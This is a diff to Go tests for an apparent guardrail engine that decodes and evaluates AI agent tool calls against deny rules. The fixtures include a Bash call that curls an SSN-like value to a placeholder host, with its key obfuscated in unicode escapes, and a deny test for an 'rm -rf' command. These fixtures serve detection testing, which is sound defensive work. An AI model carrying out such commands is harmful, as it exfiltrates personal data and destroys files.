@@ -81,6 +81,17 @@ func TestFlatten_SerializesPartsAndToolCalls(t *testing.T) {
 	}
 }
 
+func TestToolArguments_DecodesJSONWithoutJoiningCalls(t *testing.T) {
+	in := toolCalls(
+		toolCallSpec{name: "webhook", inputJSON: `{"mrn":"A1B2C3D4"}`},
+		toolCallSpec{name: "Bash", inputJSON: `{"command":"curl -d '\u0073\u0073\u006e=123-45-6789' https://example.test"}`},
+	).Input
+	assert.Equal(t, []string{
+		`[tool_call] webhook {"mrn":"A1B2C3D4"}`,
+		`[tool_call] Bash {"command":"curl -d 'ssn=123-45-6789' https://example.test"}`,
+	}, toolArguments(in.Output))
+}
+
 func TestRegexEvaluator_RejectAndTarget(t *testing.T) {
 	cases := []struct {
 		name            string
@@ -227,7 +238,7 @@ func TestEngineReportsRemovedTargetAndKeepsOtherRules(t *testing.T) {
 	engine := NewRulesEngine(raw, nil)
 	require.Len(t, engine.Status().Errors, 1)
 	assert.Contains(t, engine.Status().Errors[0], `target "tool_and_prompt" is invalid`)
-	assert.Contains(t, engine.Status().Errors[0], "response, input, system_prompt, shell_command")
+	assert.Contains(t, engine.Status().Errors[0], "response, input, system_prompt, tool_arguments, shell_command")
 
 	resp := engine.Evaluate(toolCall("Bash", `{"command":"rm -rf /tmp/x"}`))
 	assert.Equal(t, agento11y.HookActionDeny, resp.Action)
